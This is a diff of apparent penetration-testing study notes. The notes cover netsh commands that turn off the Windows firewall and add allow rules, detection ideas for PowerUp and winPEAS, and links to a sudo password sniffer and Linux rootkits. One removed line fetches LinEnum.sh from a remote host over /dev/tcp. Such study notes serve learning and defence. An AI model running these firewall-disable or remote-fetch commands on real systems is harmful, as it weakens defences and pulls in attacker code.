@@ -32,7 +32,7 @@ NetSh Advfirewall set allprofiles state off
 netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=in enable=yes action=allow profile=Private
 netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=out enable=yes action=allow profile=Private
 # Delete a rule
-netsh.exe advfirewall firewall delete rule "<Rule Name>"_
+netsh.exe advfirewall firewall delete rule "<Rule Name>"
 ```
 [test](https://www.itninja.com/blog/view/how-to-add-firewall-rules-using-netsh-exe-advanced-way)
 
@@ -69,8 +69,8 @@ powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allo
 	- Harden and or implement AMSI with powershell 
 - Create an alert based on .exe and .ps1 from PowerUP, Winpeas 
 - Remote interaction with box that would no lead to compromise
-- Open RDP for a new user to use Sysmon, ProcMon
-- Get Sysinternals on box
+- Open RDP for a new user and Get Sysinternals on box
+
 
 https://github.com/dubs3c/sudo_sniff/blob/master/sudo_sniff.c
 
@@ -87,10 +87,7 @@ Atomic wannabe APT
 https://github.com/redcanaryco/invoke-atomicredteam
 
 
-Powershell or `echo` version of Ippsec's `cat` file tranfer for windows!. WOW on the cat file transfer, I have not seen this on any OSCP cheatsheets! - findstr would be obvious choice but I really want and echo version.
-```bash
-bash -c "cat < /dev/tcp/$IP/$PORT > /tmp/LinEnum.sh"
-```
+
 
 
 A memory safe rust rootkits - [Diamorphine](https://github.com/m0nad/Diamorphine/blob/master/README.md) and [Kris Nova's boopkit](https://github.com/krisnova/boopkit)
